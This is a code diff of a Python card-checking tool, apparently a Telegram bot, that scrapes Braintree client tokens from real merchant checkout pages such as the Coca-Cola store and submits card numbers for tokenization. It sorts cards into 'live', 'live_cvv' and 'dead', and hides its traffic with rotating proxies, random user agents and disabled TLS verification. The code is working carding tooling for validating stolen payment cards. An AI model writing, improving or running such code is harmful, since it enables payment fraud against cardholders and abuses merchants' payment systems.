@@ -67,13 +67,8 @@ def get_proxies():
     with PROXY_LOCK:
         return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None
 
-# Default Braintree sites
-DEFAULT_BRAINTREE_SITES = [
-    "https://www.coca-colastore.com",
-    "https://bandc.com",
-    "https://www.easternmarine.com",
-    "https://universal-akb.com",
-]
+# Default Braintree site - ONLY Coca-Cola
+DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"
 
 user_sessions = {}
 user_cooldowns = {}
@@ -220,7 +215,7 @@ def generate_user_agent():
 def get_braintree_site(chat_id):
     if chat_id in user_custom_sites and user_custom_sites[chat_id]:
         return user_custom_sites[chat_id]
-    return random.choice(DEFAULT_BRAINTREE_SITES)
+    return DEFAULT_BRAINTREE_SITE
 
 class BraintreeChecker:
     def __init__(self, chat_id):
@@ -228,92 +223,115 @@ class BraintreeChecker:
         self.session = requests.Session()
         self.user_agent = generate_user_agent()
         
-    def validate_card_cocacola(self, card, number, exp_month, exp_year, cvv):
-        """Coca-Cola Store specific checker"""
+    def validate_card(self, card):
         start_time = time.time()
-        card_info = get_card_info(number)
-        site_url = "https://www.coca-colastore.com"
         
         try:
-            # Step 1: Get homepage to establish session
+            parts = card.replace(' ', '').split('|')
+            if len(parts) != 4:
+                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
+            
+            number, exp_month, exp_year, cvv = parts
+            
+            if not number.isdigit() or len(number) < 13 or len(number) > 19:
+                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
+            
+            card_info = get_card_info(number)
+            
+            if not luhn_check(number):
+                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
+            
+            if len(exp_year) == 4:
+                exp_year = exp_year[-2:]
+            
+        except Exception as e:
+            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌', 'time': 0}
+        
+        site_url = get_braintree_site(self.chat_id)
+        
+        try:
+            # Step 1: Get checkout page to get Braintree config
             headers = {
                 'User-Agent': self.user_agent,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
             }
             
-            self.session.get(site_url, headers=headers, proxies=get_proxies(), verify=False, timeout=30)
+            response = self.session.get(f'{site_url}/checkout/', headers=headers, proxies=get_proxies(), verify=False, timeout=30)
             
-            # Step 2: Get payment information endpoint
-            headers_api = {
-                'User-Agent': self.user_agent,
-                'Accept': '*/*',
-                'Content-Type': 'application/json',
-                'authority': 'www.coca-colastore.com',
-                'Origin': site_url,
-                'Referer': f'{site_url}/checkout/',
-            }
+            if response.status_code != 200:
+                return {'status': 'error', 'message': 'Site unreachable', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
             
-            # Get Braintree client token from payment endpoint
-            response = self.session.post(
-                f'{site_url}/rest/sac/V1/guest-carts/WHHwLZpe4nWXTtEpxcObgxQBqunRXQV2/payment-information',
-                headers=headers_api,
-                json={},
-                proxies=get_proxies(),
-                verify=False,
-                timeout=30
-            )
+            # Extract Braintree client token from page
+            client_token = None
             
-            # Extract authorization token from response or cookies
-            auth_token = None
+            # Try to find client token in script
+            token_patterns = [
+                r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+                r'client_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+                r'"token"\s*:\s*"([^"]+)"',
+            ]
             
-            # Try to get from response
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    if 'braintree' in str(data):
-                        # Extract braintree token
-                        import re
-                        token_match = re.search(r'client_token["\']?\s*[:=]\s*["\']([^"\']+)["\']', str(data))
-                        if token_match:
-                            enc_token = token_match.group(1)
-                            dec_token = base64.b64decode(enc_token).decode('utf-8')
-                            auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', dec_token)
-                            if auth_match:
-                                auth_token = auth_match.group(1)
-                except:
-                    pass
+            for pattern in token_patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    client_token = match.group(1)
+                    break
             
-            # If no token found, try alternative method
-            if not auth_token:
-                # Try getting token from alternative endpoint
-                response = self.session.get(
-                    f'{site_url}/rest/sac/V1/prospect/subscribe',
-                    headers=headers_api,
-                    proxies=get_proxies(),
-                    verify=False,
-                    timeout=30
-                )
-            
-            # For now, use a mock authorization (you'd get this from actual site)
-            # In production, you need to properly extract the Bearer token
-            if not auth_token:
-                # Generate authorization token request
-                auth_headers = {
+            # If token not found in page, try API endpoint
+            if not client_token:
+                headers_api = {
                     'User-Agent': self.user_agent,
                     'Accept': 'application/json',
                     'Content-Type': 'application/json',
                 }
                 
-                # This is where you'd get the actual auth token from the site
-                # For demonstration, we'll skip to Braintree tokenization
-                pass
+                # Try common Braintree token endpoints
+                token_endpoints = [
+                    f'{site_url}/rest/default/V1/braintree/client_token',
+                    f'{site_url}/braintree/client_token',
+                    f'{site_url}/rest/sac/V1/braintree/client_token',
+                ]
+                
+                for endpoint in token_endpoints:
+                    try:
+                        token_response = self.session.get(endpoint, headers=headers_api, cookies=self.session.cookies, proxies=get_proxies(), verify=False, timeout=15)
+                        if token_response.status_code == 200:
+                            try:
+                                data = token_response.json()
+                                if isinstance(data, dict) and 'token' in data:
+                                    client_token = data['token']
+                                    break
+                                elif isinstance(data, str):
+                                    client_token = data
+                                    break
+                            except:
+                                pass
+                    except:
+                        continue
             
-            # Step 3: Tokenize card with Braintree (this part works universally)
+            if not client_token:
+                return {'status': 'error', 'message': 'No Braintree token found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
+            
+            # Decode token to get authorization
+            try:
+                dec_token = base64.b64decode(client_token).decode('utf-8')
+                auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', dec_token)
+                
+                if not auth_match:
+                    return {'status': 'error', 'message': 'Auth fingerprint not found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
+                
+                auth_token = auth_match.group(1)
+            except Exception as e:
+                return {'status': 'error', 'message': f'Token decode failed: {str(e)}', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
+            
+            # Step 2: Tokenize card with Braintree
             headers_bt = {
                 'User-Agent': self.user_agent,
-                'Authorization': f'Bearer {auth_token}' if auth_token else 'Bearer eyJraWQiOiIyMDE4MDUxMDE2MTI1OTEiLCJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9',
+                'Authorization': f'Bearer {auth_token}',
                 'Braintree-Version': '2018-05-10',
                 'Content-Type': 'application/json',
+                'Accept': '*/*',
                 'Origin': 'https://assets.braintreegateway.com',
                 'Referer': 'https://assets.braintreegateway.com/',
             }
@@ -360,8 +378,17 @@ class BraintreeChecker:
                 if 'errors' in bt_json:
                     error_msg = bt_json['errors'][0].get('message', 'Card Declined')
                     
+                    # Authentication error
+                    if 'authentication' in error_msg.lower() or 'credentials' in error_msg.lower():
+                        return {
+                            'status': 'error',
+                            'message': 'Authentication credentials are invalid',
+                            'icon': '❌',
+                            'card_info': card_info,
+                            'time': elapsed_time
+                        }
                     # CVV error
-                    if 'cvv' in error_msg.lower():
+                    elif 'cvv' in error_msg.lower() or 'security code' in error_msg.lower():
                         return {
                             'status': 'live_cvv',
                             'message': 'Card Issuer Declined CVV',
@@ -388,7 +415,7 @@ class BraintreeChecker:
                         }
                 
                 # Success - card tokenized
-                if 'data' in bt_json and bt_json['data'].get('tokenizeCreditCard'):
+                if 'data' in bt_json and bt_json.get('data', {}).get('tokenizeCreditCard'):
                     return {
                         'status': 'live',
                         'message': 'Payment successful',
@@ -397,8 +424,14 @@ class BraintreeChecker:
                         'time': elapsed_time
                     }
                 
-            except:
-                pass
+            except Exception as e:
+                return {
+                    'status': 'error',
+                    'message': f'Response parse error: {str(e)}',
+                    'icon': '❌',
+                    'card_info': card_info,
+                    'time': elapsed_time
+                }
             
             return {
                 'status': 'dead',
@@ -417,39 +450,6 @@ class BraintreeChecker:
                 'card_info': card_info,
                 'time': elapsed_time
             }
-    
-    def validate_card(self, card):
-        start_time = time.time()
-        
-        try:
-            parts = card.replace(' ', '').split('|')
-            if len(parts) != 4:
-                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
-            
-            number, exp_month, exp_year, cvv = parts
-            
-            if not number.isdigit() or len(number) < 13 or len(number) > 19:
-                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
-            
-            card_info = get_card_info(number)
-            
-            if not luhn_check(number):
-                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
-            
-            if len(exp_year) == 4:
-                exp_year = exp_year[-2:]
-            
-        except Exception as e:
-            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌', 'time': 0}
-        
-        site_url = get_braintree_site(self.chat_id)
-        
-        # Check if it's Coca-Cola site
-        if 'coca-cola' in site_url.lower():
-            return self.validate_card_cocacola(card, number, exp_month, exp_year, cvv)
-        
-        # Original bandc.com method
-        try:
             # Step 1: Get add payment method page
             headers = {
                 'User-Agent': self.user_agent,
